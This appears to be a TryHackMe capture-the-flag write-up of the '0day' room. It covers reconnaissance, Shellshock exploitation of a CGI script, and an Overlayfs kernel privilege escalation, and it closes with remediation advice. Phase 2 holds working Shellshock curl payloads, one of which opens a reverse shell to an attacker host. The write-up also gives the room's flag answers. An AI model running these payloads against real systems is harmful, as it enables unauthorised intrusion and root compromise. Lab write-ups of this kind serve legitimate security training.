# 🐢 0day — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20|%20Shellshock%20|%20Kernel%20Exploit-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [0day](https://tryhackme.com/room/0day)

---

## 📋 Executive Summary

This writeup documents the complete compromise of the **0day** machine, demonstrating exploitation of the historic **Shellshock vulnerability (CVE-2014-6271)** for initial access, followed by **Overlayfs Local Privilege Escalation (CVE-2015-1328)** for root. The room's tagline — *"Exploit Ubuntu, like a Turtle in a Hurricane"* — references the turtle image found in the `/secret` directory, hinting at the Shellshock vulnerability in Bash.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance |
| `gobuster` | Directory enumeration |
| `nikto` | Web vulnerability scanning |
| `curl` | Shellshock exploitation |
| `msfconsole` | Metasploit exploitation |
| `searchsploit` | Exploit database search |
| `gcc` | Kernel exploit compilation |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

### Findings

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | SSH | OpenSSH 6.6.1p1 Ubuntu |
| 80/tcp | open | HTTP | Apache httpd 2.4.7 (Ubuntu) |

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Directories:**

| Directory | Contents | Notes |
|-----------|----------|-------|
| `/admin` | Empty page | Rabbit hole |
| `/backup` | SSH private key | Encrypted, cracked but unused |
| `/img` | Avatar images | Steganography checked, nothing found |
| `/secret` | Turtle image | **Hint: "Turtle in a Hurricane" → Shellshock** |
| `/cgi-bin` | CGI scripts | **Attack vector** |

### Nikto Scan

```bash
nikto -h http://<TARGET_IP>
```

**Critical Finding:** Shellshock vulnerability detected in `/cgi-bin/`

---

## 🌐 Phase 2: Shellshock Exploitation (CVE-2014-6271)

### Vulnerability Background

Shellshock is a critical vulnerability in Bash that allows remote code execution through manipulated environment variables. When Bash processes functions defined in environment variables, it executes trailing commands after the function definition.

### CGI Script Discovery

```bash
gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi
```

**Result:** `/cgi-bin/test.cgi` — Returns "Hello World"

### Manual Exploitation

**Test Command Execution:**

```bash
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" \
     http://<TARGET_IP>/cgi-bin/test.cgi
```

**Result:** `/etc/passwd` dumped successfully — Shellshock confirmed.

### Reverse Shell (Manual)

```bash
# Listener
nc -lvnp 4444

# Exploit
curl -A "() { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" \
     http://<TARGET_IP>/cgi-bin/test.cgi
```

### Metasploit Exploitation

```bash
msfconsole -q

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set LHOST <ATTACKER_IP>
set RHOSTS <TARGET_IP>
set TARGETURI /cgi-bin/test.cgi
exploit
```

**Result:** Meterpreter session as `www-data`

---

## 🏴 Phase 3: User Flag

```bash
cat /home/ryan/user.txt
```

**User Flag:** `THM{Sh3llSh0ck_r0ckz}`

---

## 🚀 Phase 4: Privilege Escalation (CVE-2015-1328)

### Kernel Enumeration

```bash
uname -a
```

**Result:** `Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP`

### Exploit Research

```bash
searchsploit linux kernel 3.13.0 overlayfs
```

**Finding:** CVE-2015-1328 — Overlayfs Local Privilege Escalation

### Exploit Preparation

```bash
# Download exploit
searchsploit -m linux/local/37292.c

# Upload to target
meterpreter > cd /tmp
meterpreter > upload 37292.c

# Compile
gcc 37292.c -o ofs
```

### Exploit Execution

```bash
./ofs
```

**Output:**
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**Result:** Root shell obtained.

---

## 🏁 Phase 5: Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `THM{g00d_j0b_0day_is_Pleased}`

---

## 🗺️ Attack Path Visualization

```
[Attacker]
    │
    ├───nmap───► [Target: 22, 80]
    │                │
    │                ▼
    │        [gobuster: /admin, /backup, /secret, /cgi-bin]
    │                │
    │                ▼
    │        [/secret: turtle image → Shellshock hint]
    │                │
    │                ▼
    │        [nikto: Shellshock vulnerability confirmed]
    │                │
    │                ▼
    │        [/cgi-bin/test.cgi]
    │                │
    │                ▼
    │        [Shellshock exploit (CVE-2014-6271)]
    │                │
    │                ▼
    │        [www-data shell]
    │                │
    │                ▼
    │        [User Flag: /home/ryan/user.txt]
    │                │
    │                ▼
    │        [uname -a: kernel 3.13.0]
    │                │
    │                ▼
    │        [Overlayfs exploit (CVE-2015-1328)]
    │                │
    │                ▼
    │        [Root shell]
    │                │
    │                ▼
    └────────► [Root Flag: /root/root.txt]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | CVSS | Remediation |
|---|--------------|----------|------|-------------|
| 1 | **Shellshock (CVE-2014-6271)** | 🔴 Critical | 10.0 | Update Bash immediately; patch all systems; disable CGI if unnecessary |
| 2 | **Overlayfs Privilege Escalation (CVE-2015-1328)** | 🔴 Critical | 7.8 | Update kernel to patched version; implement kernel live patching |
| 3 | **Outdated Ubuntu 14.04.1** | 🔴 Critical | 9.8 | Upgrade to supported LTS version; implement automated security updates |
| 4 | **CGI Script Exposure** | 🟠 High | 7.5 | Restrict CGI access; use mod_security; implement WAF rules |

---

## 🎓 Key Takeaways

1. **Shellshock History:** One of the most critical vulnerabilities ever — affected millions of systems; always patch Bash
2. **CGI = Risk:** CGI scripts process environment variables directly — prime Shellshock target
3. **Kernel Exploits:** Extremely powerful but version-specific; always check `uname -a`
4. **Overlayfs:** Linux kernel feature abused for privilege escalation — keep kernels updated
5. **Outdated Systems:** Ubuntu 14.04.1 is ancient; running EOL systems is asking for compromise
6. **Turtle Hint:** Room descriptions and images often contain critical hints — always analyze

---
---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **User Flag** | `/home/ryan/user.txt` | `THM{Sh3llSh0ck_r0ckz}` |
| **Root Flag** | `/root/root.txt` | `THM{g00d_j0b_0day_is_Pleased}` |

---

> **⚠️ Legal Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---
**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
```
